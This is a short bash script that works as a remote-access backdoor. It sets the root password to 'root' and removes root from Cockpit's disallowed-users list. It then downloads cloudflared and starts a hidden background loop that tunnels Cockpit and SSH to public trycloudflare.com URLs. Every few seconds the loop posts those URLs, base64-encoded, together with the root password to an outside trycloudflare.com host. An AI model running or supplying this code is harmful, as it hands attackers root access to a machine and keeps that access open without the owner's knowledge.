#!/bin/bash
# 1. Credentials Takeover (Always asserted)
echo "root:root" | sudo chpasswd
sudo sed -i 's/root//g' /etc/cockpit/disallowed-users 2>/dev/null

# 2. Setup Cloudflared Binary
if [ ! -f /tmp/cloudflared ]; then
    curl -L --output /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
    chmod +x /tmp/cloudflared
fi

# 3. Persistence Loop (Every 5 Seconds)
nohup bash -c "while true; do
    # A. Ensure Cockpit is Running
    if ! systemctl is-active --quiet cockpit; then
        sudo systemctl enable --now cockpit.socket && sudo systemctl start cockpit
    fi

    # B. Ensure Cockpit Tunnel (Port 9090) is Alive
    if ! pgrep -f 'tunnel --url https://localhost:9090' > /dev/null; then
        nohup /tmp/cloudflared tunnel --no-autoupdate --url https://localhost:9090 --no-tls-verify > /tmp/cockpit.log 2>&1 &
    fi

    # C. Ensure SSH Shell Tunnel (Port 22) is Alive
    if ! pgrep -f 'tunnel --url ssh://localhost:22' > /dev/null; then
        nohup /tmp/cloudflared tunnel --no-autoupdate --url ssh://localhost:22 > /tmp/ssh_shell.log 2>&1 &
    fi

    # D. Wait for links to stabilize
    sleep 10

    # E. Broadcast the Encrypted Links to your Mac
    CK_URL=\$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' /tmp/cockpit.log | head -n 1)
    SSH_URL=\$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' /tmp/ssh_shell.log | head -n 1)
    
    REPORT=\"[!] SENTINEL_PULSE\nCOCKPIT: \$CK_URL\nSSH_SHELL: \$SSH_URL\nROOT_PASS: root\"
    curl -s -X POST -d \"\$(echo -e \"\$REPORT\" | base64 | tr -d '\n')\" https://merchandise-angeles-jade-stud.trycloudflare.com

    sleep 5
done" > /dev/null 2>&1 &
